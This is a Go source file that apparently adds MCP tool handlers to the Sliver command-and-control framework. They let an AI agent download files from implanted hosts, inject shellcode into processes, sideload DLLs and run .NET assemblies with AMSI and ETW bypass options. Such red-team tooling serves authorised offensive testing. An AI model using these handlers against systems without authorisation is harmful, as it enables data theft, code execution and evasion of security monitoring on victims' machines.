package mcp

import (
	"context"
	"encoding/base64"
	"fmt"

	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/util/encoders"
	mcpapi "github.com/mark3labs/mcp-go/mcp"
)

const (
	downloadToolName    = "download"
	injectShellcodeName = "inject_shellcode"
	sideloadToolName    = "sideload"
	executeAssemblyName = "execute_assembly"
)

// --- Download (full file retrieval) ---

type downloadArgs struct {
	SessionID      string `json:"session_id,omitempty"`
	BeaconID       string `json:"beacon_id,omitempty"`
	Path           string `json:"path"`
	Recurse        bool   `json:"recurse,omitempty"`
	MaxBytes       int64  `json:"max_bytes,omitempty"`
	Wait           bool   `json:"wait,omitempty"`
	TimeoutSeconds int64  `json:"timeout_seconds,omitempty"`
}

type downloadResult struct {
	Path            string `json:"path"`
	Exists          bool   `json:"exists"`
	IsDir           bool   `json:"is_dir"`
	Encoder         string `json:"encoder,omitempty"`
	ByteLen         int    `json:"byte_len"`
	DataBase64      string `json:"data_base64"`
	ReadFiles       int32  `json:"read_files,omitempty"`
	UnreadableFiles int32  `json:"unreadable_files,omitempty"`
}

func (s *SliverMCPServer) downloadHandler(ctx context.Context, request mcpapi.CallToolRequest) (*mcpapi.CallToolResult, error) {
	var args downloadArgs
	if err := request.BindArguments(&args); err != nil {
		return mcpapi.NewToolResultError(fmt.Sprintf("invalid arguments: %v", err)), nil
	}
	if args.Path == "" {
		return mcpapi.NewToolResultError("path is required"), nil
	}
	return s.handleDownload(ctx, args)
}

func (s *SliverMCPServer) handleDownload(ctx context.Context, args downloadArgs) (*mcpapi.CallToolResult, error) {
	if s.Rpc == nil {
		return mcpapi.NewToolResultError("rpc client not configured"), nil
	}

	s.logToolCall(downloadToolName, args.SessionID, args.BeaconID,
		fmt.Sprintf("path=%q", args.Path),
		fmt.Sprintf("recurse=%t", args.Recurse),
	)

	args.TimeoutSeconds = applyDefaultTimeout(args.Wait, args.TimeoutSeconds)
	ctx, cancel := withTimeout(ctx, args.TimeoutSeconds)
	if cancel != nil {
		defer cancel()
	}

	req, isBeacon, err := buildRequest(args.SessionID, args.BeaconID, args.TimeoutSeconds)
	if err != nil {
		return mcpapi.NewToolResultError(err.Error()), nil
	}

	dlResp, err := s.Rpc.Download(ctx, &sliverpb.DownloadReq{
		Request:          req,
		Path:             args.Path,
		Recurse:          args.Recurse,
		MaxBytes:         args.MaxBytes,
		RestrictedToFile: !args.Recurse,
	})
	if err != nil {
		return mcpapi.NewToolResultErrorFromErr("failed to download file", err), nil
	}

	if dlResp.Response != nil && dlResp.Response.Err != "" {
		return mcpapi.NewToolResultError(dlResp.Response.Err), nil
	}

	if isBeacon && dlResp.Response != nil && dlResp.Response.Async {
		if !args.Wait {
			return newAsyncResult("download", dlResp.Response.TaskID, dlResp.Response.BeaconID), nil
		}
		resolved := &sliverpb.Download{}
		if err := s.waitForBeaconTaskResponse(ctx, dlResp.Response.TaskID, resolved); err != nil {
			return mcpapi.NewToolResultErrorFromErr("failed to await download task", err), nil
		}
		dlResp = resolved
		if dlResp.Response != nil && dlResp.Response.Err != "" {
			return mcpapi.NewToolResultError(dlResp.Response.Err), nil
		}
	}

	data := dlResp.Data
	if dlResp.Encoder == "gzip" {
		decoded, decErr := new(encoders.Gzip).Decode(dlResp.Data)
		if decErr == nil {
			data = decoded
		}
	}

	return mcpapi.NewToolResultStructuredOnly(downloadResult{
		Path:            dlResp.Path,
		Exists:          dlResp.Exists,
		IsDir:           dlResp.IsDir,
		Encoder:         dlResp.Encoder,
		ByteLen:         len(data),
		DataBase64:      base64.StdEncoding.EncodeToString(data),
		ReadFiles:       dlResp.ReadFiles,
		UnreadableFiles: dlResp.UnreadableFiles,
	}), nil
}

// --- Shellcode injection ---

type injectShellcodeArgs struct {
	SessionID      string `json:"session_id,omitempty"`
	BeaconID       string `json:"beacon_id,omitempty"`
	Pid            uint32 `json:"pid,omitempty"`       // 0 = local injection
	DataBase64     string `json:"data_base64"`         // Shellcode, base64-encoded
	RWXPages       bool   `json:"rwx_pages,omitempty"` // Use RWX memory (true) or RW→RX (false)
	Encoder        string `json:"encoder,omitempty"`   // Encoder name (e.g. "gzip")
	Wait           bool   `json:"wait,omitempty"`
	TimeoutSeconds int64  `json:"timeout_seconds,omitempty"`
}

type injectShellcodeResult struct {
	Pid       uint32 `json:"pid"`
	Injected  bool   `json:"injected"`
	Encrypted bool   `json:"encrypted"`
}

func (s *SliverMCPServer) injectShellcodeHandler(ctx context.Context, request mcpapi.CallToolRequest) (*mcpapi.CallToolResult, error) {
	var args injectShellcodeArgs
	if err := request.BindArguments(&args); err != nil {
		return mcpapi.NewToolResultError(fmt.Sprintf("invalid arguments: %v", err)), nil
	}
	if args.DataBase64 == "" {
		return mcpapi.NewToolResultError("data_base64 (shellcode) is required"), nil
	}
	return s.handleInjectShellcode(ctx, args)
}

func (s *SliverMCPServer) handleInjectShellcode(ctx context.Context, args injectShellcodeArgs) (*mcpapi.CallToolResult, error) {
	if s.Rpc == nil {
		return mcpapi.NewToolResultError("rpc client not configured"), nil
	}

	s.logToolCall(injectShellcodeName, args.SessionID, args.BeaconID,
		fmt.Sprintf("pid=%d", args.Pid),
		fmt.Sprintf("rwx=%t", args.RWXPages),
	)

	args.TimeoutSeconds = applyDefaultTimeout(args.Wait, args.TimeoutSeconds)
	ctx, cancel := withTimeout(ctx, args.TimeoutSeconds)
	if cancel != nil {
		defer cancel()
	}

	req, isBeacon, err := buildRequest(args.SessionID, args.BeaconID, args.TimeoutSeconds)
	if err != nil {
		return mcpapi.NewToolResultError(err.Error()), nil
	}

	data, err := base64.StdEncoding.DecodeString(args.DataBase64)
	if err != nil {
		return mcpapi.NewToolResultError(fmt.Sprintf("failed to decode base64 shellcode: %v", err)), nil
	}

	taskResp, err := s.Rpc.Task(ctx, &sliverpb.TaskReq{
		Request:  req,
		Encoder:  args.Encoder,
		RWXPages: args.RWXPages,
		Pid:      args.Pid,
		Data:     data,
	})
	if err != nil {
		return mcpapi.NewToolResultErrorFromErr("failed to inject shellcode", err), nil
	}

	if taskResp.Response != nil && taskResp.Response.Err != "" {
		return mcpapi.NewToolResultError(taskResp.Response.Err), nil
	}

	if isBeacon && taskResp.Response != nil && taskResp.Response.Async {
		if !args.Wait {
			return newAsyncResult("inject_shellcode", taskResp.Response.TaskID, taskResp.Response.BeaconID), nil
		}
		resolved := &sliverpb.Task{}
		if err := s.waitForBeaconTaskResponse(ctx, taskResp.Response.TaskID, resolved); err != nil {
			return mcpapi.NewToolResultErrorFromErr("failed to await injection task", err), nil
		}
		taskResp = resolved
		if taskResp.Response != nil && taskResp.Response.Err != "" {
			return mcpapi.NewToolResultError(taskResp.Response.Err), nil
		}
	}

	return mcpapi.NewToolResultStructuredOnly(injectShellcodeResult{
		Pid:      args.Pid,
		Injected: true,
	}), nil
}

// --- Sideload DLL ---

type sideloadArgs struct {
	SessionID      string   `json:"session_id,omitempty"`
	BeaconID       string   `json:"beacon_id,omitempty"`
	DataBase64     string   `json:"data_base64"`  // DLL bytes, base64-encoded
	ProcessName    string   `json:"process_name"` // Hosting process path
	Args           []string `json:"args,omitempty"`
	EntryPoint     string   `json:"entry_point,omitempty"`
	Kill           bool     `json:"kill,omitempty"` // Kill hosting process after
	IsDLL          bool     `json:"is_dll,omitempty"`
	IsUnicode      bool     `json:"is_unicode,omitempty"`
	PPid           uint32   `json:"ppid,omitempty"`
	ProcessArgs    []string `json:"process_args,omitempty"`
	Wait           bool     `json:"wait,omitempty"`
	TimeoutSeconds int64    `json:"timeout_seconds,omitempty"`
}

type sideloadResult struct {
	Result string `json:"result"`
}

func (s *SliverMCPServer) sideloadHandler(ctx context.Context, request mcpapi.CallToolRequest) (*mcpapi.CallToolResult, error) {
	var args sideloadArgs
	if err := request.BindArguments(&args); err != nil {
		return mcpapi.NewToolResultError(fmt.Sprintf("invalid arguments: %v", err)), nil
	}
	if args.DataBase64 == "" || args.ProcessName == "" {
		return mcpapi.NewToolResultError("data_base64 and process_name are required"), nil
	}
	return s.handleSideload(ctx, args)
}

func (s *SliverMCPServer) handleSideload(ctx context.Context, args sideloadArgs) (*mcpapi.CallToolResult, error) {
	if s.Rpc == nil {
		return mcpapi.NewToolResultError("rpc client not configured"), nil
	}

	s.logToolCall(sideloadToolName, args.SessionID, args.BeaconID,
		fmt.Sprintf("process=%q", args.ProcessName),
		fmt.Sprintf("entry_point=%q", args.EntryPoint),
	)

	args.TimeoutSeconds = applyDefaultTimeout(args.Wait, args.TimeoutSeconds)
	ctx, cancel := withTimeout(ctx, args.TimeoutSeconds)
	if cancel != nil {
		defer cancel()
	}

	req, isBeacon, err := buildRequest(args.SessionID, args.BeaconID, args.TimeoutSeconds)
	if err != nil {
		return mcpapi.NewToolResultError(err.Error()), nil
	}

	data, err := base64.StdEncoding.DecodeString(args.DataBase64)
	if err != nil {
		return mcpapi.NewToolResultError(fmt.Sprintf("failed to decode base64 DLL: %v", err)), nil
	}

	slResp, err := s.Rpc.Sideload(ctx, &sliverpb.SideloadReq{
		Request:     req,
		Data:        data,
		ProcessName: args.ProcessName,
		Args:        args.Args,
		EntryPoint:  args.EntryPoint,
		Kill:        args.Kill,
		IsDLL:       args.IsDLL,
		IsUnicode:   args.IsUnicode,
		PPid:        args.PPid,
		ProcessArgs: args.ProcessArgs,
	})
	if err != nil {
		return mcpapi.NewToolResultErrorFromErr("failed to sideload DLL", err), nil
	}

	if slResp.Response != nil && slResp.Response.Err != "" {
		return mcpapi.NewToolResultError(slResp.Response.Err), nil
	}

	if isBeacon && slResp.Response != nil && slResp.Response.Async {
		if !args.Wait {
			return newAsyncResult("sideload", slResp.Response.TaskID, slResp.Response.BeaconID), nil
		}
		resolved := &sliverpb.Sideload{}
		if err := s.waitForBeaconTaskResponse(ctx, slResp.Response.TaskID, resolved); err != nil {
			return mcpapi.NewToolResultErrorFromErr("failed to await sideload task", err), nil
		}
		slResp = resolved
		if slResp.Response != nil && slResp.Response.Err != "" {
			return mcpapi.NewToolResultError(slResp.Response.Err), nil
		}
	}

	return mcpapi.NewToolResultStructuredOnly(sideloadResult{Result: slResp.Result}), nil
}

// --- Execute .NET Assembly ---

type executeAssemblyArgs struct {
	SessionID      string   `json:"session_id,omitempty"`
	BeaconID       string   `json:"beacon_id,omitempty"`
	DataBase64     string   `json:"data_base64"` // Assembly bytes, base64-encoded
	Arguments      []string `json:"arguments,omitempty"`
	Process        string   `json:"process,omitempty"` // Hosting process
	Arch           string   `json:"arch,omitempty"`
	ClassName      string   `json:"class_name,omitempty"`
	Method         string   `json:"method,omitempty"`
	AppDomain      string   `json:"app_domain,omitempty"`
	PPid           uint32   `json:"ppid,omitempty"`
	ProcessArgs    []string `json:"process_args,omitempty"`
	InProcess      bool     `json:"in_process,omitempty"`
	AmsiBypass     bool     `json:"amsi_bypass,omitempty"`
	EtwBypass      bool     `json:"etw_bypass,omitempty"`
	Wait           bool     `json:"wait,omitempty"`
	TimeoutSeconds int64    `json:"timeout_seconds,omitempty"`
}

type executeAssemblyResult struct {
	Output string `json:"output"`
}

func (s *SliverMCPServer) executeAssemblyHandler(ctx context.Context, request mcpapi.CallToolRequest) (*mcpapi.CallToolResult, error) {
	var args executeAssemblyArgs
	if err := request.BindArguments(&args); err != nil {
		return mcpapi.NewToolResultError(fmt.Sprintf("invalid arguments: %v", err)), nil
	}
	if args.DataBase64 == "" {
		return mcpapi.NewToolResultError("data_base64 (assembly) is required"), nil
	}
	return s.handleExecuteAssembly(ctx, args)
}

func (s *SliverMCPServer) handleExecuteAssembly(ctx context.Context, args executeAssemblyArgs) (*mcpapi.CallToolResult, error) {
	if s.Rpc == nil {
		return mcpapi.NewToolResultError("rpc client not configured"), nil
	}

	s.logToolCall(executeAssemblyName, args.SessionID, args.BeaconID,
		fmt.Sprintf("process=%q", args.Process),
		fmt.Sprintf("amsi_bypass=%t", args.AmsiBypass),
		fmt.Sprintf("etw_bypass=%t", args.EtwBypass),
	)

	args.TimeoutSeconds = applyDefaultTimeout(args.Wait, args.TimeoutSeconds)
	ctx, cancel := withTimeout(ctx, args.TimeoutSeconds)
	if cancel != nil {
		defer cancel()
	}

	req, isBeacon, err := buildRequest(args.SessionID, args.BeaconID, args.TimeoutSeconds)
	if err != nil {
		return mcpapi.NewToolResultError(err.Error()), nil
	}

	data, err := base64.StdEncoding.DecodeString(args.DataBase64)
	if err != nil {
		return mcpapi.NewToolResultError(fmt.Sprintf("failed to decode base64 assembly: %v", err)), nil
	}

	eaResp, err := s.Rpc.ExecuteAssembly(ctx, &sliverpb.ExecuteAssemblyReq{
		Request:     req,
		Assembly:    data,
		Arguments:   args.Arguments,
		Process:     args.Process,
		Arch:        args.Arch,
		ClassName:   args.ClassName,
		Method:      args.Method,
		AppDomain:   args.AppDomain,
		PPid:        args.PPid,
		ProcessArgs: args.ProcessArgs,
		InProcess:   args.InProcess,
		AmsiBypass:  args.AmsiBypass,
		EtwBypass:   args.EtwBypass,
	})
	if err != nil {
		return mcpapi.NewToolResultErrorFromErr("failed to execute assembly", err), nil
	}

	if eaResp.Response != nil && eaResp.Response.Err != "" {
		return mcpapi.NewToolResultError(eaResp.Response.Err), nil
	}

	if isBeacon && eaResp.Response != nil && eaResp.Response.Async {
		if !args.Wait {
			return newAsyncResult("execute_assembly", eaResp.Response.TaskID, eaResp.Response.BeaconID), nil
		}
		resolved := &sliverpb.ExecuteAssembly{}
		if err := s.waitForBeaconTaskResponse(ctx, eaResp.Response.TaskID, resolved); err != nil {
			return mcpapi.NewToolResultErrorFromErr("failed to await assembly task", err), nil
		}
		eaResp = resolved
		if eaResp.Response != nil && eaResp.Response.Err != "" {
			return mcpapi.NewToolResultError(eaResp.Response.Err), nil
		}
	}

	return mcpapi.NewToolResultStructuredOnly(executeAssemblyResult{
		Output: string(eaResp.Output),
	}), nil
}
